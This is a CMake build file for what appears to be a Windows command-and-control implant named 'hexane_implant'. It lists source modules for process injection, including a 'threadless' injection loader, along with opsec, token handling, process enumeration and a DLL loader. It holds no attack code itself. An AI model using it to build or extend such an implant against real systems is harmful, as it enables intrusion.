cmake_minimum_required(VERSION 3.26)
project(hexane_implant)

set(CMAKE_CXX_STANDARD 23)
set(HOME ${CMAKE_SOURCE_DIR})
set(META "C:/Program Files (x86)/Windows Kits/NETFXSDK/4.8/Include/um")

enable_language(ASM_NASM)
include_directories(include ${CMAKE_SOURCE_DIR} ${META})

set (SOURCES
        core/src/cipher.cpp
        core/src/commands.cpp
        core/src/stdlib.cpp
        core/src/implant.cpp
        core/src/inject.cpp
        core/src/memory.cpp
        core/src/dispatch.cpp
        core/src/network.cpp
        core/src/opsec.cpp
        core/src/parser.cpp
        core/src/process.cpp
        core/src/start.asm
        core/src/stream.cpp
        core/src/utils.cpp
)

set (INCLUDES
        core/implant.ld
        core/corelib.hpp
        core/monolith.hpp
        core/ntimports.hpp
        core/include/cipher.hpp
        core/include/commands.hpp
        core/include/stdlib.hpp
        core/include/implant.hpp
        core/include/inject.hpp
        core/include/memory.hpp
        core/include/dispatch.hpp
        core/include/names.hpp
        core/include/network.hpp
        core/include/opsec.hpp
        core/include/parser.hpp
        core/include/process.hpp
        core/include/stream.hpp
        core/include/utils.hpp
        core/include/tokens.hpp
        commands/include/registry.hpp
        core/dotnet.hpp
)

set (COMMANDS
        commands/src/EnumProcess.cpp
        commands/src/registry.cpp
        core/src/tokens.cpp
)

set (LOADER
        loader/resource.rc
        loader/src/dllmain.cpp
        loader/src/exemain.cpp
        loader/src/resource.cpp
)

set (INJECT
        inject/threadless/loader.asm
        inject/threadless/OpenFileExecute.cpp
)

add_executable(hexane_implant ${SOURCES} ${COMMANDS} ${LOADER} ${INJECT} ${INCLUDES})